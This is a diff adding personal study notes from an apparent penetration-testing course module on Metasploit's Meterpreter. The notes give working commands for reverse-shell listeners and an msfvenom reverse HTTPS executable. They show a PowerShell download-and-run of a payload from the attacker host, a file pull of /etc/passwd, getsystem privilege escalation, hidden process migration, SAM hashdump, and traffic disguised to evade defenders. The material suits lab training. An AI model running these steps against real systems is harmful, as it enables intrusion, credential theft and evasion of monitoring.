@@ -1,0 +1,120 @@
+	- dynamically extended at run-time
+	- payload resides entirely in memory on the target
+	- communication is encrypted by defaul
+	- All payloads are staged
+		- In situations where our bandwidth is limited or we want to use the same payload to compromise multiple systems in an assessment, a non-staged Meterpreter payload comes in quite handy.
+
+#### Small Example
+1. Start a multi/handler listener with the corresponding settings in Metasploit. In addition, we'll **set** the option **ExitOnSession** to **fals**e. It specifies that the listener stays active for new sessions without the need to restart it for every incoming session.
+    - `sudo msfconsole -q`
+    - `use multi/handler`
+    - `set payload windows/x64/meterpreter/reverse_tcp`
+    - `set LHOST 192.168.119.5`
+    - `set LPORT 443`
+    - `set ExitOnSession false`
+    - `run -j`
+### Set up And Run commands
+	- After selecting the 64-bit non-staged version of _meterpreter_reverse_tcp_ as payload, we can review its options
+	- `run`
+	- `help`
+	- start gathering information
+		- `sysinfo
+		- `getuid
+	- *channels*
+		- when interacting with a system within a session
+	- start interactive shell
+		- `shell`
+	- execute command in the context of a *channel*
+		- `id`
+	- Background the *channel*
+		- `Ctrl + Z`
+	- Start a second interactive shell, execute a command, and also, background the channel.
+		- `shell`
+		- `whoami`
+		- `Ctrl + z`
+	- List all active channels
+		- `channel -l`
+	- Interact with channel 1 again
+		- `channel -i 1`
+		- `id`
+	- Review commands
+		- `help`
+	- Use the _download_ and _upload_ commands from the category _File system Commands_ to transfer files to and from the system.
+		- change the local directory on our Kali machine to **/home/kali/Downloads**
+			- `lcd /home/kali/Downloads`
+		- Download **/etc/passwd** from the target machine to our Kali system.
+			- `download /etc/passwd`
+		- **cat** the file on local system
+			- `lcat /home/kali/Downloads/passwd`
+		- Upload *unix-privesc-check* tp **/tmp**
+			- ```upload /usr/bin/unix-privesc-check /tmp/```
+		- Check
+			- `ls /tmp`
+		- [Note:]
+			- [If our target runs the Windows operating system, we need to escape the backslashes in the destination path with backslashes like "\\"]
+	- let's use another 64-bit Linux Meterpreter payload
+		- `exit`
+		- `show payloads`
+	- Use HTTPS connection meterpreter payload
+			- As the traffic itself is encrypted with SSL/TLS, defenders will only obtain information about HTTPS requests
+		- `set payload 10`
+		- `show options`
+		- `run`
+		- will seem like regular HTTPS traffic
+		- if they would check the address of the communication endpoint (our Kali machine in this example), they'd only get a _Not found_ page with HTTP code 404 in the browser.
+	- We should always attempt to obtain an initial foothold with a raw TCP shell and then deploy a Meterpreter shell as soon as we have disabled or bypassed potential security technologies.
+
+### Core Meterpreter Post-Exploitation Features
+
+Example:
+`Let's assume we already gained an initial foothold on the target system and deployed a bind shell as way of accessing the system.`
+- Create a Windows rev shell exe binary
+	- ```msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.196 LPORT=443 -f exe -o met.exe```
+- Launch mulit/handler and set payload and options
+	- ```set payload windows/x64/meterpreter_reverse_https```
+	- `set LPORT 443`
+	- `run`
+- start Py server to serve **met.exe**.
+- Connect to bind shell
+	- ```nc 192.168.249.223 4444```
+- Download **met.exe**
+	- `powershell`
+	- ```iwr -uri http://192.168.45.205:8000/binary.exe -Outfile binary.exe```
+	- `.\met.exe`
+- Start exploring post-exploitation commands and features.
+	- **idletime**
+		- It displays the time for which a user has been idle.
+		- first commands as it indicates if the target machine is currently in use or not.
+	- **getsystem**
+		- Attempts to automatically elevate our permissions to _NT AUTHORITY\SYSTEM_.
+				- uses various techniques using named pipe impersonation and token duplication
+				- attempting to leverage _SeImpersonatePrivilege_[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/the-metasploit-framework/performing-post-exploitation-with-metasploit/core-meterpreter-post-exploitation-features#fn1) and _SeDebugPrivilege_.
+					- by using _Named Pipe Impersonation (PrintSpooler variant)_
+	- **shell**
+		- interactive shell
+		- `whoami /priv`
+			- Ex. user _luiza_ has _SeImpersonatePrivilege_ assigned
+		- Ex:
+			- **getuid**
+			- **getsystem**
+			- **getuid** 
+	- **migrate**
+		- move the execution of our Meterpreter payload to a different process
+			- so process doesnt get close or removed 
+		- can only migrate same (or lower) integrity and privilege level.
+		- Ex:
+			- `ps`
+			- `migrate 8052
+			- `getuid` -> new user (meterpreter running in the context of new process)
+	- **execute**
+		- creates a new process by specifying a command or program.
+		- Example: let's start a hidden Notepad process and migrate to it as user _offsec_
+			- ```execute -H -f notepad```
+				- -H = hidden process
+				- -f = specify command or program
+			- `migrate 2720`
+				- migrating to the newly spawned process
+	- **hashdump**
+		- dumps the contents of the SAM database
+	- **screenshare**
+		- displays the target machine's desktop in real-time.
